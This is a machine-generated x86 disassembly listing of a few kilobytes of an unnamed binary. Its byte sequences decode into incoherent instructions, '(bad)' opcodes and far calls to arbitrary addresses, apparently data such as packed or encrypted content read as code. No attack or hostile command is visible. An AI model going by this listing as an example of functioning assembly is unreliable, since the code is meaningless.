  41d482:	sub    BYTE PTR [eax],bh
  41d484:	mov    ds:0xc145dbb3,eax
  41d489:	out    dx,eax
  41d48a:	call   0xb4a6:0x9318acbe
  41d491:	test   eax,0x94c6c5a8
  41d496:	mov    ebp,0xb42303ca
  41d49b:	mov    dl,0xbd
  41d49d:	call   0x8b01e838
  41d4a2:	add    eax,0x5de25cfe
  41d4a7:	xchg   esi,eax
  41d4a8:	mov    ebx,0x9cfb36e3
  41d4ad:	gs daa 
  41d4af:	lahf   
  41d4b0:	xor    DWORD PTR [edx-0x550de75b],edx
  41d4b6:	push   ecx
  41d4b7:	push   ebp
  41d4b8:	or     BYTE PTR ds:0xcf649968,dh
  41d4be:	adc    ch,bh
  41d4c0:	xchg   edx,eax
  41d4c1:	pop    ebp
  41d4c2:	push   edx
  41d4c3:	dec    edi
  41d4c4:	pop    eax
  41d4c5:	sti    
  41d4c6:	mov    cs,WORD PTR [eax+0x28]
  41d4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4ca:	dec    ebp
  41d4cb:	cli    
  41d4cc:	push   eax
  41d4cd:	cmp    BYTE PTR [edx-0x9],cl
  41d4d0:	inc    esp
  41d4d1:	cdq    
  41d4d2:	inc    esi
  41d4d3:	or     eax,0x820e31b1
  41d4d8:	enter  0x2658,0xb7
  41d4dc:	dec    bh
  41d4de:	xchg   ecx,esi
  41d4e0:	xchg   ah,dl
  41d4e2:	jne    0x41d524
  41d4e4:	sub    ebp,ebx
  41d4e6:	add    dh,dh
  41d4e8:	xor    ebx,ebx
  41d4ea:	adc    eax,0x164502e8
  41d4ef:	xchg   BYTE PTR [eax+0x33],al
  41d4f2:	popa   
  41d4f3:	jp     0x41d527
  41d4f5:	mov    ebp,DWORD PTR ds:[ebp-0x480710be]
  41d4fc:	ins    DWORD PTR es:[edi],dx
  41d4fd:	out    dx,eax
  41d4fe:	mov    ch,dh
  41d500:	jge    0x41d4ef
  41d502:	cmp    BYTE PTR [edi+0x3468e5],dl
  41d508:	aam    0x5f
  41d50a:	outs   dx,WORD PTR ds:[esi]
  41d50c:	fwait
  41d50d:	ror    DWORD PTR [eax],1
  41d50f:	mov    dh,0xd8
  41d511:	mov    esi,0x651add9
  41d516:	fsubp  st(2),st
  41d518:	xchg   edi,eax
  41d519:	cdq    
  41d51a:	popa   
  41d51b:	mov    dh,0x88
  41d51d:	pop    ds
  41d51e:	pop    esp
  41d51f:	mov    dl,0x32
  41d521:	lds    eax,FWORD PTR [ecx+0xc]
  41d524:	lods   al,BYTE PTR ds:[esi]
  41d525:	add    DWORD PTR [edi-0x72],0x2de86169
  41d52c:	mov    bl,0x2d
  41d52e:	aad    0x5d
  41d530:	int    0xa1
  41d532:	in     al,0x7a
  41d534:	or     al,0x6b
  41d536:	in     eax,0x9
  41d538:	popf   
  41d539:	(bad)  
  41d53a:	repnz inc BYTE PTR [eax+ebx*1+0x4cca6f3e]
  41d542:	or     eax,0x2173189a
  41d547:	sbb    eax,0x932a770c
  41d54c:	retf   0xe3a
  41d54f:	arpl   WORD PTR [eax-0x55487b92],si
  41d555:	fldenv [edx]
  41d557:	mov    fs,WORD PTR [eax]
  41d559:	xchg   edi,eax
  41d55a:	inc    ebx
  41d55b:	sub    al,0x3a
  41d55d:	push   ss
  41d55e:	and    BYTE PTR [ebp+0x5aeb2323],bh
  41d564:	xchg   esi,eax
  41d565:	xchg   BYTE PTR ds:0x238fa93d,dh
  41d56b:	adc    BYTE PTR [eax-0x35b3f898],al
  41d571:	cmp    al,0xa4
  41d573:	test   al,0x77
  41d575:	push   ebp
  41d576:	aad    0xa0
  41d578:	push   ecx
  41d579:	adc    eax,DWORD PTR [bp+di-0x61a]
  41d57e:	and    al,0xa9
  41d580:	sbb    eax,0xac12a4bd
  41d585:	push   ecx
  41d586:	retf   0x2699
  41d589:	aas    
  41d58a:	jbe    0x41d50e
  41d58c:	sbb    BYTE PTR [ebp-0x21e57141],dh
  41d592:	sbb    BYTE PTR [edi],al
  41d594:	and    DWORD PTR [ecx+0x485b33f],ecx
  41d59a:	mov    edx,DWORD PTR [ebp-0x1a]
  41d59d:	inc    ecx
  41d59e:	cs leave 
  41d5a0:	aas    
  41d5a1:	int    0x71
  41d5a3:	adc    DWORD PTR es:[ebx-0x531fecac],0xb50ebcb2
  41d5ae:	xor    al,0x92
  41d5b0:	addr16 lock mov al,ds:0x5944
  41d5b5:	sub    eax,ebx
  41d5b7:	mov    ebx,DWORD PTR [ebx-0x6cfb1971]
  41d5bd:	mov    ch,0xa2
  41d5bf:	pop    ds
  41d5c0:	add    al,0x50
  41d5c2:	mov    ebx,0x2bc0f4b1
  41d5c7:	das    
  41d5c8:	and    al,0xbb
  41d5ca:	cs cmp eax,0x3eea18c2
  41d5d0:	mov    esi,0x2899a953
  41d5d5:	imul   edi,DWORD PTR [esi-0x2e4a8c9e],0xffffffbe
  41d5dc:	out    dx,al
  41d5dd:	ja     0x41d5b5
  41d5df:	xor    al,0x44
  41d5e1:	out    0x58,al
  41d5e3:	xchg   ebx,eax
  41d5e4:	mov    ?,WORD PTR [edx-0x3d]
  41d5e7:	jl     0x41d57d
  41d5e9:	push   edi
  41d5ea:	or     esp,0x2ce613a0
  41d5f0:	js     0x41d576
  41d5f2:	fdiv   QWORD PTR [ebx-0x3daf2437]
  41d5f8:	es in  eax,dx
  41d5fa:	xor    eax,0x4f590528
  41d5ff:	or     DWORD PTR [edi-0x3ad6ef02],esp
  41d605:	sbb    DWORD PTR [ebp-0x47],0x7d9e4eb3
  41d60c:	push   edi
  41d60d:	jecxz  0x41d608
  41d60f:	mov    ecx,0x649cc349
  41d614:	add    ebx,DWORD PTR [ebx]
  41d616:	lahf   
  41d617:	add    ch,bl
  41d619:	or     al,dh
  41d61b:	dec    ecx
  41d61c:	adc    DWORD PTR [esi],ebp
  41d61e:	je     0x41d655
  41d620:	ins    DWORD PTR es:[edi],dx
  41d621:	mov    ebp,0x4aef2b66
  41d626:	cld    
  41d627:	rcl    ebx,1
  41d629:	push   cs
  41d62a:	mov    cl,0x5c
  41d62c:	pop    edx
  41d62d:	es std 
  41d62f:	aam    0x71
  41d631:	cmp    esi,DWORD PTR [eax+0x7453201d]
  41d637:	xor    eax,0x7644c1dc
  41d63c:	mov    edi,DWORD PTR ds:0xaa6aad62
  41d642:	into   
  41d643:	fs dec edx
  41d645:	sahf   
  41d646:	mov    ebp,eax
  41d648:	add    DWORD PTR ds:0x74d11c99,ebp
  41d64e:	aam    0x1b
  41d650:	iret   
  41d651:	and    al,0xf4
  41d653:	sbb    al,0xed
  41d655:	out    dx,al
  41d656:	rcr    BYTE PTR [esi-0x3d],cl
  41d659:	test   eax,0xcad611d9
  41d65e:	js     0x41d65d
  41d660:	sar    dl,1
  41d662:	pop    ss
  41d663:	pop    ebp
  41d664:	or     BYTE PTR [ebx-0x2fdc587e],bh
  41d66a:	inc    eax
  41d66b:	cdq    
  41d66c:	adc    eax,DWORD PTR [edi]
  41d66e:	mov    edx,0x93166618
  41d673:	jno    0x41d6bb
  41d675:	xchg   esp,eax
  41d676:	sbb    edx,DWORD PTR [ebx]
  41d678:	test   DWORD PTR [ebx],ebx
  41d67a:	mov    esp,0xee9d0bb1
  41d67f:	fcomp  QWORD PTR [esi+0x5e]
  41d682:	cli    
  41d683:	and    cl,ah
  41d685:	(bad)  
  41d686:	call   0xf6b0:0x9d8547b2
  41d68d:	mov    ecx,0x35a926de
  41d692:	or     ebx,esi
  41d694:	push   cs
  41d695:	test   eax,0x71785e75
  41d69a:	out    dx,al
  41d69b:	in     eax,dx
  41d69c:	out    0xea,al
  41d69e:	enter  0x7370,0x22
  41d6a2:	xchg   edx,eax
  41d6a3:	into   
  41d6a4:	scas   al,BYTE PTR es:[edi]
  41d6a5:	icebp  
  41d6a6:	xchg   esi,eax
  41d6a7:	xchg   edi,eax
  41d6a8:	xchg   DWORD PTR [ebx+0x2e614d02],edi
  41d6ae:	fsubr  QWORD PTR [ebp+eax*2+0x17]
  41d6b2:	or     dl,ah
  41d6b4:	xchg   ecx,eax
  41d6b5:	stos   BYTE PTR es:[edi],al
  41d6b6:	daa    
  41d6b7:	adc    BYTE PTR [ecx],0x5a
  41d6ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6bb:	(bad)  
  41d6bc:	cs iret 
  41d6be:	sub    ebp,DWORD PTR [edx+ebx*1-0x358faab0]
  41d6c5:	test   eax,0x8b87147e
  41d6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6cb:	aaa    
  41d6cc:	xchg   esi,eax
  41d6cd:	and    al,0x31
  41d6cf:	pop    eax
  41d6d0:	xor    al,0x37
  41d6d2:	(bad)  
  41d6d3:	mov    ebp,0x9646aafe
  41d6d8:	pop    ds
  41d6d9:	cmp    ah,BYTE PTR [ecx+0x1b]
  41d6dc:	cmp    BYTE PTR [ebp+ecx*8+0x188d6190],bh
  41d6e3:	sbb    BYTE PTR [ebx-0x8],ch
  41d6e6:	mov    bl,0x6a
  41d6e8:	mov    ebx,0x526d36a0
  41d6ed:	cmp    dl,BYTE PTR [ebp-0x25]
  41d6f0:	mov    cl,0xea
  41d6f2:	lods   eax,DWORD PTR ds:[esi]
  41d6f3:	mov    ecx,0x602dace2
  41d6f8:	addr16 jmp 0x41d68c
  41d6fb:	ins    DWORD PTR es:[edi],dx
  41d6fc:	outs   dx,BYTE PTR ds:[esi]
  41d6fd:	test   ax,0xc21c
  41d701:	jg     0x41d687
  41d703:	dec    edi
  41d704:	call   0x58892ab0
  41d709:	repz push esp
  41d70b:	js     0x41d6d6
  41d70d:	dec    edi
  41d70e:	pop    edx
  41d70f:	adc    dl,bl
  41d711:	rcr    BYTE PTR [ebx],cl
  41d713:	jmp    0x41d6fa
  41d715:	sbb    eax,0x2e3e11ed
  41d71a:	inc    esi
  41d71b:	inc    ecx
  41d71c:	jbe    0x41d755
  41d71e:	push   0x15a20e74
  41d723:	xor    DWORD PTR [edi+0x4f947caa],ebp
  41d729:	sar    BYTE PTR [eax+0x7b9cbcd6],1
  41d72f:	js     0x41d70b
  41d731:	push   0xffffffe3
  41d733:	ret    0xb90b
  41d736:	and    dh,BYTE PTR [esi+0x1f]
  41d739:	and    ecx,DWORD PTR [eax]
  41d73b:	mov    al,0x80
  41d73d:	cld    
  41d73e:	ret    
  41d73f:	test   BYTE PTR [ebp+0x9],al
  41d742:	jl     0x41d6da
  41d744:	or     ebx,DWORD PTR [ebx+0x32]
  41d747:	inc    ebp
  41d748:	je     0x41d707
  41d74a:	mov    BYTE PTR [esi],0x1a
  41d74d:	ss retf 
  41d74f:	cdq    
  41d750:	loop   0x41d744
  41d752:	popa   
  41d753:	mov    al,ds:0xb89db8cb
  41d758:	test   ah,dh
  41d75a:	sahf   
  41d75b:	fwait
  41d75c:	in     al,0xff
  41d75e:	push   ds
  41d75f:	pop    edi
  41d760:	dec    esp
  41d761:	call   0x9133:0x6e031205
  41d768:	push   es
  41d769:	add    BYTE PTR [edx],0xa9
  41d76c:	shl    BYTE PTR [esi+0x658a8604],0xf1
  41d773:	(bad)  
  41d774:	pusha  
  41d775:	pop    ss
  41d776:	mov    esp,0x7c751ada
  41d77b:	push   ebp
  41d77c:	lods   al,BYTE PTR ds:[esi]
  41d77d:	(bad)  
  41d77e:	adc    al,0xd0
  41d780:	imul   esp,DWORD PTR [esi+0x5466d9ac],0x4c
  41d787:	into   
  41d788:	inc    ebp
  41d789:	lea    ecx,[eax]
  41d78b:	mov    ds:0xb3bb6205,eax
  41d790:	pop    es
  41d791:	ja     0x41d7ff
  41d793:	(bad)  
  41d794:	loope  0x41d744
  41d796:	in     eax,0xa9
  41d798:	sub    DWORD PTR [ebx],0xfffffff9
  41d79b:	out    dx,eax
  41d79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d79d:	mov    ebx,0x1387c652
  41d7a2:	or     eax,0x22e36c4d
  41d7a7:	arpl   WORD PTR [esi-0x6d],bx
  41d7aa:	pop    edi
  41d7ab:	arpl   WORD PTR [ebx+0x70551725],ax
  41d7b1:	inc    edi
  41d7b2:	out    0xc5,eax
  41d7b4:	push   ss
  41d7b5:	add    ch,bl
  41d7b7:	inc    esp
  41d7b8:	sbb    ch,0xb6
  41d7bb:	xor    BYTE PTR ds:0x9eed5702,dl
  41d7c1:	outs   dx,BYTE PTR ds:[esi]
  41d7c2:	mov    esi,ss
  41d7c4:	xchg   ebx,eax
  41d7c5:	aad    0xa
  41d7c7:	xchg   ecx,eax
  41d7c8:	sbb    DWORD PTR [ebx+0x4a],esp
  41d7cb:	loope  0x41d782
  41d7cd:	aad    0x51
  41d7cf:	daa    
  41d7d0:	(bad)  
  41d7d2:	mov    ah,0x43
  41d7d4:	dec    ebx
  41d7d5:	xor    DWORD PTR [edx],0xabd94547
  41d7db:	fisubr DWORD PTR [edx]
  41d7dd:	adc    edx,esi
  41d7df:	sub    ecx,edi
  41d7e1:	lds    esp,FWORD PTR [ebx-0x7292ea22]
  41d7e7:	lds    esi,FWORD PTR [edx]
  41d7e9:	ja     0x41d788
  41d7eb:	xchg   edx,eax
  41d7ec:	add    al,0x10
  41d7ee:	jp     0x41d7ae
  41d7f0:	mov    ebx,0xe61d5bca
  41d7f5:	popf   
  41d7f6:	cmp    BYTE PTR [ecx],bl
  41d7f8:	ror    BYTE PTR [edi-0x36],cl
  41d7fb:	sbb    DWORD PTR [edx-0x30149da2],edi
  41d801:	xor    bl,BYTE PTR [edi-0x71]
  41d804:	xchg   ebx,eax
  41d805:	fwait
  41d806:	mov    cl,0x85
  41d808:	inc    ecx
  41d809:	xor    eax,0xd1f4b88b
  41d80e:	adc    eax,0xafdf9291
  41d813:	cmp    eax,DWORD PTR [ebx]
  41d815:	cmp    eax,0x93c49097
  41d81a:	loope  0x41d869
  41d81c:	mov    dl,0x87
  41d81e:	(bad)  
  41d81f:	cld    
  41d820:	jl     0x41d846
  41d822:	(bad)  
  41d823:	mov    ?,WORD PTR [eax]
  41d825:	sub    DWORD PTR [esi],0x741e23ec
  41d82b:	jge    0x41d859
  41d82d:	jb     0x41d808
  41d82f:	push   cs
  41d830:	bound  eax,QWORD PTR [ebp+0x1d5ee74d]
  41d836:	adc    al,0xaa
  41d838:	mov    BYTE PTR ds:0x13b52b36,bl
  41d83e:	mov    BYTE PTR [ecx-0x722f7e],ah
  41d844:	adc    edi,edi
  41d846:	sbb    cl,BYTE PTR [esi*2-0x1ef962e1]
  41d84d:	(bad)  
  41d84e:	nop
  41d84f:	or     al,dh
  41d851:	xchg   ebp,eax
  41d852:	stos   DWORD PTR es:[edi],eax
  41d853:	pop    ecx
  41d854:	mov    dl,BYTE PTR [ebx+0x61]
  41d857:	mov    al,0x23
  41d859:	hlt    
  41d85a:	cmp    ebx,DWORD PTR [eax]
  41d85c:	(bad)  
  41d85d:	addr16 (bad) 
  41d85f:	call   0x602f2da3
  41d864:	jns    0x41d821
  41d866:	test   BYTE PTR [ebx-0x6c],dh
  41d869:	inc    DWORD PTR [ebx+0x78c153ca]
  41d86f:	dec    ecx
  41d870:	mov    al,0x36
  41d872:	out    dx,eax
  41d873:	ret    0x47fe
  41d876:	cmp    edx,DWORD PTR ds:0x14e0db3
  41d87d:	pop    edi
  41d87e:	pop    edi
  41d87f:	cs sub eax,0xb0740342
  41d885:	arpl   di,bp
  41d887:	ds adc eax,0x97b2dc85
  41d88d:	adc    al,0x46
  41d88f:	dec    ebp
  41d890:	and    DWORD PTR [edx+0x5e],esp
  41d893:	pop    ds
  41d894:	dec    ecx
  41d895:	lds    edx,FWORD PTR [edi]
  41d897:	cdq    
  41d898:	pop    eax
  41d899:	sub    esp,0xb09854e2
  41d89f:	or     al,0x6
  41d8a1:	retf   
  41d8a2:	mov    al,ds:0x173cafb
  41d8a7:	and    eax,0x32a259c3
  41d8ac:	pop    es
  41d8ad:	push   edx
  41d8ae:	jg     0x41d8f6
  41d8b0:	int    0xe2
  41d8b2:	jo     0x41d8eb
  41d8b4:	push   edx
  41d8b5:	mov    ebx,0xb328f5e1
  41d8ba:	inc    ebx
  41d8bb:	jle    0x41d87b
  41d8bd:	call   0x9adf8e82
  41d8c2:	mov    cl,0x1a
  41d8c4:	cld    
  41d8c5:	daa    
  41d8c6:	sub    DWORD PTR [ebp-0x35],ebx
  41d8c9:	or     BYTE PTR ds:0xd0f72f82,cl
  41d8cf:	mov    ebp,0x892c2993
  41d8d4:	push   cs
  41d8d5:	jle    0x41d8e4
  41d8d7:	mov    bh,BYTE PTR [ecx+0x3]
  41d8da:	enter  0x8a9b,0xa4
  41d8de:	imul   edx,DWORD PTR [esi+esi*2],0x7f
  41d8e2:	fidiv  DWORD PTR [ecx+0x13]
  41d8e5:	dec    ebp
  41d8e6:	xor    esp,DWORD PTR [edx+ebx*4-0x57]
  41d8ea:	and    esi,DWORD PTR [edi-0x24]
  41d8ed:	mov    bl,0xaf
  41d8ef:	ja     0x41d87e
  41d8f1:	leave  
  41d8f2:	fld    DWORD PTR [eax+0x47cf9a1d]
  41d8f8:	(bad)  
  41d8f9:	jae    0x41d905
  41d8fb:	inc    ebx
  41d8fc:	cdq    
  41d8fd:	xchg   ebx,eax
  41d8fe:	daa    
  41d8ff:	or     BYTE PTR [edi-0x7a],bl
  41d902:	(bad)  
  41d903:	div    esi
  41d905:	inc    esp
  41d906:	cmp    al,0xaf
  41d908:	inc    ebx
  41d909:	push   ebx
  41d90a:	cwde   
  41d90b:	jne    0x41d8c2
  41d90d:	adc    DWORD PTR [edi-0xf],esp
  41d910:	pop    ds
  41d911:	inc    edi
  41d912:	clc    
  41d913:	call   0x8fa40bbb
  41d918:	fisttp DWORD PTR [esi+0x69]
  41d91b:	push   ds
  41d91c:	shr    BYTE PTR [ebp-0x4f099dfd],1
  41d922:	add    eax,0xdcd43e54
  41d927:	in     al,dx
  41d928:	imul   esi,DWORD PTR [ebp-0x7d],0x1
  41d92c:	mov    dh,0x74
  41d92e:	cmc    
  41d92f:	adc    al,ch
  41d931:	fldcw  WORD PTR ds:[ebx-0x5b]
  41d935:	loop   0x41d97a
  41d937:	sub    DWORD PTR [edi],ebx
  41d939:	iret   
  41d93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d93b:	les    edx,FWORD PTR [ecx+0x15]
  41d93e:	jne    0x41d9a1
  41d940:	mov    edi,0xb6aa001c
  41d945:	and    ebp,DWORD PTR [edi]
  41d947:	in     eax,dx
  41d948:	leave  
  41d949:	test   DWORD PTR ds:0xd0f07bd7,ecx
  41d94f:	leave  
  41d950:	jae    0x41d98d
  41d952:	xchg   ecx,eax
  41d953:	xor    DWORD PTR [esi-0x551897ed],esp
  41d959:	ds push edi
  41d95b:	push   edi
  41d95c:	push   ebp
  41d95d:	dec    esp
  41d95e:	mov    ah,al
  41d960:	aas    
  41d961:	sbb    ch,al
  41d963:	xchg   edi,eax
  41d964:	ins    BYTE PTR es:[edi],dx
  41d965:	fld    DWORD PTR [esi]
  41d967:	dec    ebx
  41d968:	mov    dh,0xf4
  41d96a:	xchg   cl,ah
  41d96c:	outs   dx,DWORD PTR ds:[esi]
  41d96d:	lods   al,BYTE PTR ds:[esi]
  41d96e:	dec    esi
  41d96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d970:	mov    edi,0x5d03aa69
  41d975:	addr16 add eax,0x3b5e833
  41d97b:	mov    esp,eax
  41d97d:	rcr    edi,cl
  41d97f:	or     DWORD PTR [esi-0x76a203ec],edx
  41d985:	mov    esp,0x620a62ba
  41d98a:	les    esi,FWORD PTR [ebp-0x3c43651d]
  41d990:	outs   dx,DWORD PTR ds:[esi]
  41d991:	cmp    eax,0xf0b8a2a2
  41d996:	adc    dh,BYTE PTR [ebx+0x165db9c1]
  41d99c:	jecxz  0x41d969
  41d99e:	fs jg  0x41d9e2
  41d9a1:	inc    ebx
  41d9a2:	dec    edi
  41d9a3:	ret    0x974c
  41d9a6:	push   esp
  41d9a7:	cmp    eax,0xb157cb33
  41d9ac:	fsub   DWORD PTR [edx+edx*1-0x58]
  41d9b0:	mov    dh,0xf9
  41d9b2:	fisub  WORD PTR [ebp-0x5b041101]
  41d9b8:	loop   0x41d9ae
  41d9ba:	sti    
  41d9bb:	enter  0x77e8,0x6d
  41d9bf:	sub    eax,0x58f9d170
  41d9c4:	fstp   DWORD PTR [eax+0x28]
  41d9c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9c8:	and    bh,BYTE PTR [ecx-0x69]
  41d9cb:	add    bl,BYTE PTR [esi+0x28]
  41d9ce:	ja     0x41d9bd
  41d9d0:	loop   0x41d9e9
  41d9d2:	inc    edi
  41d9d3:	(bad)  
  41d9d5:	repz jmp 0xc5f8:0xe4375a61
  41d9dd:	sub    bl,BYTE PTR [edx]
  41d9df:	inc    ebp
  41d9e0:	stos   DWORD PTR es:[edi],eax
  41d9e1:	cmp    BYTE PTR [edi+0x2e],ch
  41d9e4:	add    ebx,DWORD PTR [ecx-0x4fd97f78]
  41d9ea:	dec    eax
  41d9eb:	mov    eax,ds:0xac640dd8
  41d9f0:	and    al,0x28
  41d9f2:	xchg   bh,cl
  41d9f4:	repz lock daa 
  41d9f7:	mov    esp,0x48f0a09a
  41d9fc:	jae    0x41da1d
  41d9fe:	mov    ebx,0xa014d30a
  41da03:	scas   al,BYTE PTR es:[edi]
  41da04:	and    ecx,esi
  41da06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da07:	mov    ecx,0xb8867481
  41da0c:	pushf  
  41da0d:	fisttp WORD PTR ds:[edx]
  41da10:	retf   
  41da11:	or     dl,BYTE PTR [edi]
  41da13:	sub    ch,ch
  41da15:	fisttp QWORD PTR [ebx]
  41da17:	pop    eax
  41da18:	fst    st(3)
  41da1a:	imul   esi,DWORD PTR [edx],0x7b83527c
  41da20:	adc    dh,BYTE PTR [esi+0x30]
  41da23:	enter  0xe347,0x25
  41da27:	sub    eax,0x5a126c2d
  41da2c:	lods   al,BYTE PTR ds:[esi]
  41da2d:	shr    ebp,1
  41da2f:	or     al,0x82
  41da31:	(bad)  
  41da32:	repz pop ebx
  41da34:	sbb    DWORD PTR [eax-0x12984eed],0x70
  41da3b:	xchg   ebx,eax
  41da3c:	mov    ebp,0x9d00f3f1
  41da41:	mov    cl,0xd0
  41da43:	lods   al,BYTE PTR ds:[esi]
  41da44:	fiadd  DWORD PTR [ebx]
  41da46:	ror    DWORD PTR [ebp-0x32],0x15
  41da4a:	in     al,dx
  41da4b:	popf   
  41da4c:	sahf   
  41da4d:	int    0x51
  41da4f:	bound  ecx,QWORD PTR [ebp-0x2c2e4ae1]
  41da55:	jb     0x41d9dd
  41da57:	or     eax,0xba6fbffa
  41da5c:	stos   BYTE PTR es:[edi],al
  41da5d:	sahf   
  41da5e:	xor    al,0xf7
  41da60:	loope  0x41daa4
  41da62:	aad    0x78
  41da64:	fsub   st,st(6)
  41da66:	fdiv   DWORD PTR [edx-0xe]
  41da69:	outs   dx,DWORD PTR ds:[esi]
  41da6a:	test   DWORD PTR [edx-0x28dbab41],ebp
  41da70:	sub    BYTE PTR [edi],0xdd
  41da73:	dec    ebx
  41da74:	adc    DWORD PTR [esi],esp
  41da76:	push   cs
  41da77:	jns    0x41da00
  41da79:	xchg   BYTE PTR [edi-0x782739f2],dh
  41da7f:	lock scas al,BYTE PTR es:[edi]
  41da81:	dec    edi
  41da82:	cmp    BYTE PTR [edi],cl
  41da84:	jle    0x41dae4
  41da86:	adc    bl,BYTE PTR [edi+0x72fff924]
  41da8c:	xchg   ebx,eax
  41da8d:	test   DWORD PTR [esi+0x16021229],0xee9b4214
  41da97:	ja     0x41da4a
  41da99:	jbe    0x41dad0
  41da9b:	popa   
  41da9c:	push   edx
  41da9d:	mov    edi,0xc34ee46f
  41daa2:	or     DWORD PTR [ebp+0x16],ecx
  41daa5:	sbb    ebp,esp
  41daa7:	dec    DWORD PTR [edx-0x5e]
  41daaa:	out    0x6,al
  41daac:	mov    gs,WORD PTR [ecx+0x56f12890]
  41dab2:	test   BYTE PTR [edx+0x7119dd0e],dl
  41dab8:	pop    eax
  41dab9:	push   esp
  41daba:	sub    eax,DWORD PTR [ecx-0x6e]
  41dabd:	lock xchg ebx,eax
  41dabf:	or     DWORD PTR [edi-0x6b7c5b9d],0x1
  41dac6:	fwait
  41dac7:	jle    0x41dae2
  41dac9:	je     0x41dae7
  41dacb:	fs iret 
  41dacd:	inc    ebx
  41dace:	enter  0xfe48,0x0
  41dad2:	(bad)  
  41dad3:	jmp    0x41da85
  41dad5:	enter  0x4c68,0x9a
  41dad9:	data16 test BYTE PTR [edx-0x778e7f64],dl
  41dae0:	(bad)  
  41dae1:	xchg   edi,eax
  41dae2:	xor    edi,ebp
  41dae4:	rcr    esi,1
  41dae6:	test   DWORD PTR [ebx+eiz*1],0x920f055e
  41daed:	push   ebx
  41daee:	sbb    dh,ch
  41daf0:	ret    
  41daf1:	xor    al,0xca
  41daf3:	sub    BYTE PTR [edi+0x72],bh
  41daf6:	ins    BYTE PTR es:[edi],dx
  41daf7:	inc    eax
  41daf8:	call   esi
  41dafa:	dec    ebp
  41dafb:	test   DWORD PTR [edi+0x1d],esp
  41dafe:	mov    ebx,0xe031d2bd
  41db03:	mov    ds:0xe6f70bfa,al
  41db08:	xor    edx,edi
  41db0a:	mov    BYTE PTR [esp+esi*2],ch
  41db0d:	jge    0x41db77
  41db0f:	sbb    ecx,DWORD PTR [edi]
  41db11:	mov    ch,0xb4
  41db13:	pop    esi
  41db14:	int3   
  41db15:	adc    al,0x1f
  41db17:	je     0x41dac0
  41db19:	lds    edi,FWORD PTR [ecx-0xc509c7e]
  41db1f:	sub    BYTE PTR [ebx-0x52a7a672],dh
  41db25:	shl    BYTE PTR [edx+esi*4+0x77b74385],cl
  41db2c:	adc    al,0x56
  41db2e:	mov    al,0xb7
  41db30:	cmp    ah,al
  41db32:	mov    WORD PTR [edx-0x1c722c4],ds
  41db38:	into   
  41db39:	imul   edi,DWORD PTR [eax+0x1d],0xb
  41db3d:	fild   DWORD PTR [eax]
  41db3f:	jns    0x41db5c
  41db41:	scas   al,BYTE PTR es:[edi]
  41db42:	cmp    BYTE PTR [ebx-0x3cfecf97],al
  41db48:	inc    esi
  41db49:	jl     0x41db8b
  41db4b:	xor    BYTE PTR [ecx+eax*4],al
  41db4e:	dec    ecx
  41db4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db50:	push   ecx
  41db51:	jae    0x41db4f
  41db53:	adc    eax,0x1445ae13
  41db58:	scas   al,BYTE PTR es:[edi]
  41db59:	int    0xe4
  41db5b:	ja     0x41db5b
  41db5d:	sub    al,0x1d
  41db5f:	scas   eax,DWORD PTR es:[edi]
  41db60:	mov    bl,0x56
  41db62:	add    ch,bl
  41db64:	inc    esp
  41db65:	fsubr  DWORD PTR [esi+0x71]
  41db68:	or     ch,dl
  41db6a:	iret   
  41db6b:	repnz cwde 
  41db6d:	mov    WORD PTR [edx+0x3c],cs
  41db70:	mul    DWORD PTR [edi]
  41db72:	jne    0x41dba6
  41db74:	jo     0x41dbc3
  41db76:	rcr    BYTE PTR [edx-0x7d64a76c],0x7f
  41db7d:	fldenv [esi+0x27]
  41db80:	dec    edi
  41db81:	or     ah,dh
  41db83:	rcl    DWORD PTR [ebx],1
  41db85:	sbb    BYTE PTR [ebp-0x3dd122b0],dl
  41db8b:	push   ebp
  41db8c:	inc    ebp
  41db8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db8e:	jno    0x41dbc2
  41db90:	test   eax,0xa4b5c14e
  41db95:	addr16 adc edx,esp
  41db98:	sub    al,0x11
  41db9a:	xchg   BYTE PTR [edi-0x33379edc],al
  41dba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba1:	gs inc eax
  41dba3:	imul   BYTE PTR cs:0x50e89c20
  41dbaa:	ret    
  41dbab:	out    0x42,al
  41dbad:	out    dx,al
  41dbae:	mov    ds:0x44343521,eax
  41dbb3:	xor    al,0xcb
  41dbb5:	out    dx,eax
  41dbb6:	xor    ch,BYTE PTR fs:[edi+0x7d]
  41dbba:	xor    edx,DWORD PTR [eax-0x2]
  41dbbd:	dec    esp
  41dbbe:	mov    ds:0x9dbcef29,al
  41dbc3:	or     dh,dl
  41dbc5:	scas   eax,DWORD PTR es:[edi]
  41dbc6:	outs   dx,BYTE PTR ds:[esi]
  41dbc7:	test   DWORD PTR [edi],esi
  41dbc9:	aad    0x39
  41dbcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbcc:	or     esi,DWORD PTR [ebx]
  41dbce:	cli    
  41dbcf:	popf   
  41dbd0:	pop    ss
  41dbd1:	outs   dx,DWORD PTR ds:[esi]
  41dbd2:	mov    edx,0x279d7a1b
  41dbd7:	into   
  41dbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbd9:	jge    0x41dc10
  41dbdb:	push   es
  41dbdc:	pop    ds
  41dbdd:	cs mov al,0x6e
  41dbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbe2:	mov    ah,0xaf
  41dbe4:	adc    ah,BYTE PTR [edi-0x4c]
  41dbe7:	mov    ebp,0x1d62f049
  41dbec:	in     al,dx
  41dbed:	sub    DWORD PTR [ebx+0x2d],0x87ac211c
  41dbf4:	aad    0x5d
  41dbf6:	xor    edx,ecx
  41dbf8:	sub    eax,0x99146ea7
  41dbfd:	arpl   cx,cx
  41dbff:	xchg   edx,eax
  41dc00:	sbb    DWORD PTR [ecx],edx
  41dc02:	ss maxps xmm2,xmm2
